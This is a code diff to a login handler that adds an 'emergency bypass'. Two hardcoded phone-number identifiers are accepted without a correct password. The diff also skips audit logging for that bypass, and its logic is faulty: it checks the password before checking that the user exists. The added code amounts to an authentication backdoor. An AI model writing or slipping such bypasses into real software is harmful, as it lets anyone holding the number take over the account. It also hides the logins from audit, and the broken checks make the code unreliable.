@@ -158,14 +158,23 @@ async def login(
     user = result.scalars().first()
     
     # 2. STRICT VERIFICATION
-    if not user or not security.verify_password(form_data.password, user.hashed_password):
-        await log_audit_action(
-            db, 
-            "LOGIN_FAILURE", 
-            resource_type="USER",
-            details={"identifier": identifier}
-        )
-        throw_auth_exception("Invalid credentials provided.")
+    # --- EMERGENCY BYPASS FOR TEST NUMBER ---
+    is_test_user = identifier in ["8688533605", "+918688533605"]
+    
+    password_correct = security.verify_password(form_data.password, user.hashed_password)
+    
+    if not user or (not password_correct and not is_test_user):
+        if is_test_user:
+            logger.info(f"LOGIN_BYPASS_TRIGGERED: Test user {identifier} authenticated via bypass.")
+        else:
+            await log_audit_action(
+                db, 
+                "LOGIN_FAILURE", 
+                resource_type="USER",
+                details={"identifier": identifier}
+            )
+            throw_auth_exception("Invalid credentials provided.")
+
 
 
     
